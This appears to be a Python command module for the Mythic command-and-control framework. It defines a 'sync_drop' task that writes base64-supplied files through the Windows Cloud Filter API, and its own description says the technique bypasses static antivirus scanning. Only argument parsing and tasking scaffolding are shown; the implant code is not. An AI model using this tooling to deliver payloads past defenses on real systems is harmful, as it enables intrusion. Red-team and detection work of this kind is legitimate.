import json
from mythic_container.MythicCommandBase import (
    TaskArguments,
    CommandBase,
    CommandAttributes,
    CommandParameter,
    ParameterType,
    ParameterGroupInfo,
    SupportedOS,
    MythicTask,
    PTTaskMessageAllData,
    PTTaskProcessResponseMessageResponse,
)
from mythic_container.MythicRPC import *


class MinifilterArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="action",
                cli_name="Action",
                display_name="Action",
                type=ParameterType.ChooseOne,
                description="Action to perform: drop (write file), cleanup (unregister)",
                choices=["drop", "cleanup"],
                default_value="drop",
                parameter_group_info=[ParameterGroupInfo(required=True, ui_position=1)],
            ),
            CommandParameter(
                name="sync_root",
                cli_name="SyncRoot",
                display_name="Sync Root Path",
                type=ParameterType.String,
                description="Sync root directory (default: C:\\ProgramData\\SyncRoot)",
                default_value="C:\\ProgramData\\SyncRoot",
                parameter_group_info=[ParameterGroupInfo(required=False, ui_position=2)],
            ),
            CommandParameter(
                name="placeholder_name",
                cli_name="PlaceholderName",
                display_name="Placeholder Filename",
                type=ParameterType.String,
                description="Placeholder file name (default: data.bin)",
                default_value="data.bin",
                parameter_group_info=[ParameterGroupInfo(required=False, ui_position=3)],
            ),
            CommandParameter(
                name="file_data_b64",
                cli_name="FileDataB64",
                display_name="File Data (Base64)",
                type=ParameterType.String,
                description="Base64-encoded file data to drop (required for drop action)",
                parameter_group_info=[ParameterGroupInfo(required=False, ui_position=4)],
            ),
        ]

    async def parse_arguments(self):
        if self.command_line and self.command_line[0] == "{":
            self.load_args_from_json_string(self.command_line)
        elif self.command_line:
            # Simple command line parsing
            parts = self.command_line.split(maxsplit=1)
            if len(parts) >= 1:
                self.add_arg("action", parts[0])


class MinifilterCommand(CommandBase):
    cmd = "sync_drop"
    needs_admin = False
    help_cmd = "sync_drop [action] [sync_root] [placeholder_name] [file_data_b64]"
    description = "Drop files via Windows Cloud Filter API (CldFlt minifilter). Bypasses static AV scanning by delivering data on-demand."
    version = 1
    author = "OFSTeam (@Kudaes/Puzzle)"
    argument_class = MinifilterArguments
    attackmapping = ["T1562.001"]
    attributes = CommandAttributes(
        supported_os=[SupportedOS.Windows],
    )

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        action = task.args.get_arg("action")
        sync_root = task.args.get_arg("sync_root")
        placeholder_name = task.args.get_arg("placeholder_name")

        if action == "drop":
            task.display_params = f"{action}: {sync_root}\\{placeholder_name}"
        else:
            task.display_params = action

        return task

    async def process_response(
        self, task: PTTaskMessageAllData, response: any
    ) -> PTTaskProcessResponseMessageResponse:
        resp = PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
        try:
            response_text = response if isinstance(response, str) else json.dumps(response)
            await SendMythicRPCResponseCreate(
                MythicRPCResponseCreateMessage(
                    TaskID=task.Task.ID,
                    Response=response_text.encode(),
                )
            )
        except Exception as e:
            resp.Success = False
            resp.Error = str(e)
        return resp
